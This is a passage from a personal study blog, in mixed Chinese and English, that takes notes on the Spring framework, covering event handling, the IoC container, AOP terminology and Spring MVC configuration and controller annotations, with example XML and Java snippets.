class="meta">@Bean</span></span><br><span class="line"> <span class="meta">@Scope</span>(<span class="string">"property"</span>)</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Foo <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="function">reuturn <span class="title">Foo</span><span class="params">()</span></span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Event-Handing-in-Spring"><a href="#Event-Handing-in-Spring" class="headerlink" title="Event Handing in Spring"></a>Event Handing in Spring</h3><p>事件处理</p><p>The  core(核心) of Spring is the ApplicationContext ,which manages the complete life cycle(周期) of the beans.</p><p>loding beans时, ApplicationContext 发布某些类型的事件 . 例如 a ContextStartedEvent is published when the context is started and ContextStoppedEvent is published when the context is stopped</p><p>ApplicationContext 通过ApplicationEvent class和 ApplicationListen interface 提供事件处理,如果bean implements the ApplicationListener</p><table><thead><tr><th align="center">Sr.No.</th><th align="center">Spring Built-in Events &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>ContextRefreshedEvent</strong>This event is published when the <em>ApplicationContext</em> is either initialized or refreshed. This can also be raised using the refresh() method on the <em>ConfigurableApplicationContext</em> interface.</td></tr><tr><td align="center">2</td><td align="center"><strong>ContextStartedEvent</strong>This event is published when the <em>ApplicationContext</em> is started using the start() method on the <em>ConfigurableApplicationContext</em> interface. You can poll your database or you can restart any stopped application after receiving this event.</td></tr><tr><td align="center">3</td><td align="center"><strong>ContextStoppedEvent</strong>This event is published when the <em>ApplicationContext</em> is stopped using the stop() method on the <em>ConfigurableApplicationContext</em> interface. You can do required housekeep work after receiving this event.</td></tr><tr><td align="center">4</td><td align="center"><strong>ContextClosedEvent</strong>This event is published when the <em>ApplicationContext</em> is closed using the close() method on the <em>ConfigurableApplicationContext</em> interface. A closed context reaches its end of life; it cannot be refreshed or restarted.</td></tr><tr><td align="center">5</td><td align="center"><strong>RequestHandledEvent</strong>This is a web-specific event telling all beans that an HTTP request has been serviced.</td></tr></tbody></table><p>Spring的事件处理是单线程的,因此,如果事件被发布,则直到并且除非所有接收者都收到消息,否则流程将被阻塞并且流程不会继续. 因此,如果要使用事件处理,则在设计应用程序时十分小心 be careful</p><h4 id="监听上下文事件"><a href="#监听上下文事件" class="headerlink" title="监听上下文事件"></a>监听上下文事件</h4><p>要侦听上下文事件,bean应该实现ApplicationListener接口, 该接口只有一个方法 onApplicationEvent(), </p><p><img src="../images/java_web/image-20210404212310883.png" alt="image-20210404212310883"></p><p><img src="../images/java_web/image-20210404212316459.png" alt="image-20210404212316459"></p><p>上面实现了两个Spring中定义的事件 ,进行了简单写入</p><p><img src="../images/java_web/image-20210404212517061.png" alt="image-20210404212517061"></p><p>ApplicationContex对象通过 start()方法和stop()方法 创建 开始和结束事件</p><h3 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h3><p>编写和发布自己的自定义事件需要采取许多步骤,  将跟随教程发布和处理Cutstom Spring Events</p><table><thead><tr><th></th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>创建一个名称为<em>SpringExample</em>的项目，并在创建的项目的<strong>src</strong>文件夹下创建一个<em>com.tutorialspoint</em>包。所有类都将在此程序包下创建。</td></tr><tr><td>2</td><td>使用“<em>添加外部JAR”</em>选项添加所需的Spring库，如“ <em>Spring Hello World示例”</em>一章中所述。</td></tr><tr><td>3</td><td>通过扩展<strong>ApplicationEvent</strong>创建事件类<em>CustomEvent</em>。此类必须定义一个默认构造函数，该构造函数应继承ApplicationEvent类的构造函数。</td></tr><tr><td>4</td><td>一旦定义了事件类，就可以从任何类中发布它，让我们说一下实现<em>ApplicationEventPublisherAware的*</em>EventClassPublisher*。您还需要在XML配置文件中将该类声明为Bean，以便容器可以将Bean标识为事件发布者，因为它实现了ApplicationEventPublisherAware接口。</td></tr><tr><td>5</td><td>可以在一个类中处理已发布的事件，比方说<em>EventClassHandler</em>，它实现<em>ApplicationListener</em>接口，并为自定义事件实现<em>onApplicationEvent</em>方法。</td></tr><tr><td>6</td><td>在<strong>src</strong>文件夹下创建bean配置文件<em>Beans.xml</em>，并在<em>MainApp</em>类中创建Spring应用程序。</td></tr><tr><td>7</td><td>最后一步是创建所有Java文件和Bean配置文件的内容，然后按以下说明运行应用程序。</td></tr></tbody></table><p>通过上述步骤可以创建一个自己的事件并发布</p><p>通过教程简单的创建了一个小的自定义事件 ,但对于其原理和用处不是很明白,所以goole了一下</p><h4 id="Spring中自定义Event事件的使用和浅析"><a href="#Spring中自定义Event事件的使用和浅析" class="headerlink" title="Spring中自定义Event事件的使用和浅析"></a>Spring中自定义Event事件的使用和浅析</h4><p><a href="https://blog.csdn.net/tuzongxun/article/details/53637159" target="_blank" rel="noopener">参考</a></p><p>参考文章内提到了事件驱动模型 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">事件驱动模型也就是我们常说的观察者，或者发布-订阅模型；理解它的几个关键点：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> 首先是一种对象间的一对多的关系；最简单的如交通信号灯，信号灯是目标（一方），行人注视着信号灯（多方）；</span><br><span class="line"><span class="number">2</span> 当目标发送改变（发布），观察者（订阅者）就可以接收到改变；</span><br><span class="line"><span class="number">3</span> 观察者如何处理（如行人如何走，是快走/慢走/不走，目标不会管的），目标无需干涉；所以就松散耦合了它们之间的关系。</span><br></pre></td></tr></table></figure><p>该例子将时间的发布比喻为信号灯, 也就是说事件的发布相当于信号灯</p><p>自定义事件需要继承Application类, 相当于给信号灯通电,使信号灯可以亮起 </p><p>创建一个监听类, 需要实现ApplicationListener接口 ,并且重写 onApplicationEvent()方法, 也就是提供了信号的意思, 比如绿灯行,红灯听 监听类可以是多方的, 因为红绿灯可以被多个人看到</p><p>第三步,需要一个控制信号灯变化的东西,也就是控制信号灯的内容  红黄绿灯的程序和电路</p><p>通过main方法将静止的灯和人动起来</p><p>行人看灯,电路通电</p><p>可以通过实验在写一个 监听类</p><h3 id="IoC容器"><a href="#IoC容器" class="headerlink" title="IoC容器"></a>IoC容器</h3><p>Spring容器是Spring框架的核心，容器将会创建对象，将他们连接在一起，对其进行配置，并管理从创建到销毁的整个生命周期</p><p>Spring容器使用DI来管理组成应用程序的组件。这些对象称为Spring Bean</p><p>容器通过读取提供的配置元数据来获取有关要实例化，配置和组装哪些对象的指令。配置元数据可以用XML，Java批注或Java代码表示。下图代表了Spring的工作原理的高级视图。Spring IoC容器利用Java POJO类和配置元数据来生成完全配置且可执行的系统或应用程序。</p><p><img src="../images/java_web/spring_ioc_container.jpg" alt="春季IoC容器"></p><p>Spring提供了两种不同类型的容器</p><table><thead><tr><th align="center">序号</th><th align="center">容器及说明</th></tr></thead><tbody><tr><td align="center">1个</td><td align="center"><a href="https://www.tutorialspoint.com/spring/spring_beanfactory_container.htm" target="_blank" rel="noopener">Spring BeanFactory容器</a>这是为DI提供基本支持的最简单的容器，由<em>org.springframework.beans.factory.BeanFactory</em>接口定义。Spring仍存在BeanFactory及其相关接口，例如BeanFactoryAware，InitializingBean，DisposableBean，目的是向后兼容与Spring集成的大量第三方框架。</td></tr><tr><td align="center">2个</td><td align="center"><a href="https://www.tutorialspoint.com/spring/spring_applicationcontext_container.htm" target="_blank" rel="noopener">Spring ApplicationContext容器</a>此容器添加了更多特定于企业的功能，例如从属性文件解析文本消息的功能以及将应用程序事件发布到感兴趣的事件侦听器的功能。该容器由<em>org.springframework.context.ApplicationContext</em>接口定义。</td></tr></tbody></table><p>所述<em>的ApplicationContext</em>容器包括所有功能<em>的BeanFactory</em>容器，因此，通常建议在<em>Bean工厂</em>。BeanFactory仍可用于轻量级应用程序，例如移动设备或基于Applet的应用程序，这些应用程序的数据量和速度非常重要。</p><h4 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h4><p>Aspect oriented programming(AOP)</p><table><thead><tr><th align="center">r.No</th><th align="center">Terms &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>Aspect</strong>  This is a module which has a set of APIs providing cross-cutting requirements. For example, a logging module would be called AOP aspect for logging. An application can have any number of aspects depending on the requirement.</td></tr><tr><td align="center">2</td><td align="center">*<em>Join point *</em> This represents a point in your application where you can plug-in the AOP aspect. You can also say, it is the actual place in the application where an action will be taken using Spring AOP framework.</td></tr><tr><td align="center">3</td><td align="center"><strong>Advice</strong>   This is the actual action to be taken either before or after the method execution. This is an actual piece of code that is invoked during the program execution by Spring AOP framework.</td></tr><tr><td align="center">4</td><td align="center">*<em>Pointcut *</em> This is a set of one or more join points where an advice should be executed. You can specify pointcuts using expressions or patterns as we will see in our AOP examples.</td></tr><tr><td align="center">5</td><td align="center"><strong>Introduction</strong>  An introduction allows you to add new methods or attributes to the existing classes.</td></tr><tr><td align="center">6</td><td align="center">*<em>Target object *</em>The object being advised by one or more aspects. This object will always be a proxied object, also referred to as the advised object.</td></tr><tr><td align="center">7</td><td align="center">*<em>Weaving *</em> Weaving is the process of linking aspects with other application types or objects to create an advised object. This can be done at compile time, load time, or at runtime.</td></tr></tbody></table><p>types of Advice</p><p>Spring aspects can work with five kinds of advice mentioned as follows −</p><table><thead><tr><th align="center">Sr.No</th><th align="center">Advice &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>before</strong>Run advice before the a method execution.</td></tr><tr><td align="center">2</td><td align="center"><strong>after</strong>Run advice after the method execution, regardless of its outcome.</td></tr><tr><td align="center">3</td><td align="center"><strong>after-returning</strong>Run advice after the a method execution only if method completes successfully.</td></tr><tr><td align="center">4</td><td align="center"><strong>after-throwing</strong>Run advice after the a method execution only if method exits by throwing an exception.</td></tr><tr><td align="center">5</td><td align="center"><strong>around</strong>Run advice before and after the advised method is invoked.</td></tr></tbody></table><p>自定义方面的实施</p><p>Spring支持@AspectJ 批注样式方法 和 基于模式的方法来实现自定义方面. 一下各节详细说明了两种方法</p><table><thead><tr><th></th><th>方法与描述</th></tr></thead><tbody><tr><td>1 基于XML模式</td><td>使用常规类以及基于XML的配置来实现切面</td></tr><tr><td>2 基于@AspectJ</td><td>@AspectJ是一种将切面声明为带有Java 5批注的常规Java类的样式</td></tr></tbody></table><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>Spring Web MVC框架提供了Model-View-Controller(MVC)架构和线程的组件,可用于开发灵活且松散耦合的Web应用程序. MVC模式导致分离应用程序的不同方面(输入逻辑, 业务逻辑和UI逻辑) </p><ul><li>该<strong>模型</strong>封装了应用程序数据，通常它们将由POJO组成。</li><li>该<strong>视图</strong>负责呈现模型数据，并在总体上产生HTML输出，客户端的浏览器可以解释。</li><li>该<strong>控制器</strong>负责处理用户请求，并且建立一个合适的模型，并将其传递到用于渲染的图。</li></ul><h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p>Spring Web模型视图控制器（MVC）框架是围绕处理所有HTTP请求和响应的<em>DispatcherServlet</em>设计的。下图说明了Spring Web MVC <em>DispatcherServlet</em>的请求处理工作流程-</p><p><img src="../images/java_web/spring_dispatcherservlet.png" alt="Spring DispatcherServlet"></p><p>以下是与<em>DispatcherServlet</em>的传入HTTP请求相对应的事件序列-</p><ul><li>收到HTTP请求后，<em>DispatcherServlet<em>咨询</em>HandlerMapping</em> 来调用适当的<em>Controller</em>。</li><li>该<em>控制器</em>接受请求，并调用基于所使用GET或POST方法相应的服务的方法。服务方法将基于定义的业务逻辑设置模型数据，并将视图名称返回给<em>DispatcherServlet</em>。</li><li>所述<em>的DispatcherServlet</em>将帮助从<em>的ViewResolver</em>到拾取该请求的已定义视图。</li><li>视图完成后，<em>DispatcherServlet</em>将模型数据传递到视图，该视图最终在浏览器上呈现。</li></ul><p>所需配置</p><p>您需要通过使用<strong>web.xml</strong>文件中的URL映射来映射希望<em>DispatcherServlet</em>处理的请求。以下是显示<strong>HelloWeb</strong> <em>DispatcherServlet</em>示例的声明和映射的示例-</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span> = <span class="string">"WebApp_ID"</span> <span class="attr">version</span> = <span class="string">"2.4"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns</span> = <span class="string">"http://java.sun.com/xml/ns/j2ee"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://java.sun.com/xml/ns/j2ee </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Spring MVC Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">      <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<strong>web.xml中</strong>的文件将被保存在你的Web应用程序的WebContent / WEB-INF目录下。初始化<strong>HelloWeb</strong> DispatcherServlet时，框架将尝试从位于应用程序WebContent / WEB-INF目录中名为<strong>[servlet-name] -servlet.xml</strong>的文件中加载应用程序上下文。在这种情况下，我们的文件将是<strong>HelloWebservlet.xml</strong>。</p><p>接下来，<servlet-mapping>标记指示哪个DispatcherServlet将处理哪些URL。在这里，所有以<strong>.jsp</strong>结尾的HTTP请求都将由<strong>HelloWeb</strong> DispatcherServlet处理。</p><p>如果不想使用默认文件名作为*[servlet-name] -servlet.xml<em>和默认位置作为</em>WebContent / WEB-INF<em>，则可以通过在web.xml文件中添加Servlet侦听器</em>ContextLoaderListener*来自定义此文件名和位置。如下-</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app...</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-------- DispatcherServlet definition goes here-----&gt;</span></span><br><span class="line">   ....</span><br><span class="line">   <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/HelloWeb-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.context.ContextLoaderListener</span><br><span class="line">      <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HelloWebservlet.xml必须配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span> = <span class="string">"location.package"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span> = <span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"prefix"</span> <span class="attr">value</span> = <span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"suffix"</span> <span class="attr">value</span> = <span class="string">".jsp"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>The [servle-tname]-servlet.xml file will be used to create the beans defined, overriding the  definitions of any beans defined with the same name in the global scope</li><li>The *<a href="context:component-scan...">context:component-scan...</a>* tag will be use to activate Spring MVC annotation scanning capability which allows to make use of annotations like @Controller and @RequestMapping etc.</li><li>The <em>InternalResourceViewResolver</em> will have rules defined to resolve the view names. As per the above defined rule, a logical view named <strong>hello</strong> is delegated to a view implementation located at <em>/WEB-INF/jsp/hello.jsp</em> .</li></ul><p>定义解析视图名称规则, 根据上述定义的规则, 名为hello的逻辑视图被委派给/WEB-INF/jsp/hello.jsp</p><p>自定义.jsp 文件名称和内容, </p><h4 id="定义控制器"><a href="#定义控制器" class="headerlink" title="定义控制器"></a>定义控制器</h4><p>@Controller 注解 表明特定类供应控制器的作用 </p><p>在mvc配置文件中通过  <strong>&lt;context:component-scan /&gt;</strong> 扫描相应的类包，就可以使一个 POJO 类变成一个可以处理 HTTP 请求的控制器</p><p>可以创建数量不限的控制器用于处理不头同的业务请求</p><p>@RequestMapping 注解将用于将URl 映射到要么整个类或特定处理程序方法</p><p>所以可以根据需要将 @RequestMapping 调整到合适的位置</p><p>&lt;mvn:annotationDriven /&gt;  标签基本上是将你的Sprign上下文允许请求调度到控制器</p><p> essentially sets you your Spring context to allow for dispatching requests to Controller</p><h4 id="一些简单的用法and-基础"><a href="#一些简单的用法and-基础" class="headerlink" title="一些简单的用法and 基础"></a>一些简单的用法and 基础</h4><h5 id="Requesting-下方法的返回值"><a href="#Requesting-下方法的返回值" class="headerlink" title="@Requesting 下方法的返回值"></a>@Requesting 下方法的返回值</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span> ,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">printHello</span><span class="params">(ModelMap model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>,<span class="string">"Hello Spring MVC Framework !"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>retrun “hello”; 返回的为hello.jsp页面 </p><h5 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebController</span> </span>&#123;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/index"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/redirect"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">redirect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"redirect:finalPage"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/finalPage"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">finalPage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"final"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>将 重定向到 fianl.jsp </p><h5 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span> = <span class="string">"/pages/**"</span> <span class="attr">location</span> = <span class="string">"/WEB-INF/pages/"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>&lt;mvc：resources …. /&gt;</strong>用于映射静态页面。的<strong>映射</strong>属性必须是一个Ant图案指定一个HTTP请求的URL模式。该<strong>位置</strong>属性必须指定为静态页面，包括images，stylesheets，JavaScript和其它静态内容的一个或多个有效的资源目录位置。可以使用逗号分隔的值列表来指定多个资源位置。</p><h5 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h5><ol><li><p>映射请求  处理URL请求, 注解可以标记在类上或方法上 </p></li><li><p>Dispatcher 截获请求后就通过@RequestMapping 提供的映射信息确定请求所对应的处理方法</p></li><li><p>@RequestMapping中可以指定value（请求URL）、method（请求的方法）、params（请求参数）、heads（请求头），他们之间时    与的关系，使用多个条件联合查询，可使请求精确化。</p></li><li><p>支持Ant风格的Url , Ant风格地址支持三种匹配符 ?  匹配文件名中的一个字符</p><p> 匹配文件名中的任意字符   * *: * * 匹配多层路径 </p></li><li><p>@Pathvariable 映射URL绑定的占位符</p><p>通过@PathVariable可以将URL中占位符参数绑定到控制器处理方法的入参中</p></li></ol><p>请求的URL为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"helloworld/1"</span>&gt;</span>To success<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>，可将“1”传入到方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld/&#123;id&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"helloWorld"</span>+id);</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="映射请求参数、请求头"><a href="#映射请求参数、请求头" class="headerlink" title="映射请求参数、请求头"></a>映射请求参数、请求头</h6><ol><li><p>使用@RequestParam 可以把请求参数传递给请求方法 value : 参数名, required: 是否必须</p><p> 请求Url: <code>&lt;a href=&quot;helloworld?username=123&quot;&gt;To success &lt;/a&gt;</code></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@RequestParam(value=<span class="string">"username"</span> required=<span class="keyword">false</span>)</span>String un)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"helloworld :"</span>+ un);</span><br><span class="line">reuturn <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用 @RequestHeader绑定请求报头信息，请求头包含了若干属性，服务器可据此获知客户端的信息。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@RequestHeader(<span class="string">"Accept-Encoding"</span>)</span> String encoding)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"helloWorld:"</span>+encoding);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用@CookieValue绑定请求中的Cookie值</p></li></ol><pre><code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@CookieValue(<span class="string">"JSESSIONID"</span>)</span> String sessionId)</span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"helloWorld:"</span>+sessionId);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><ol start="4"><li><p>使用POJO对象绑定请求参数, SpringMvc会按照请求参数名和POJO属性名自动进行配置, 自动为该对象填充属性,支持联属性<br> 1)表单, 此表单对应一个User 的JavaBean </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"testPojo"</span> <span 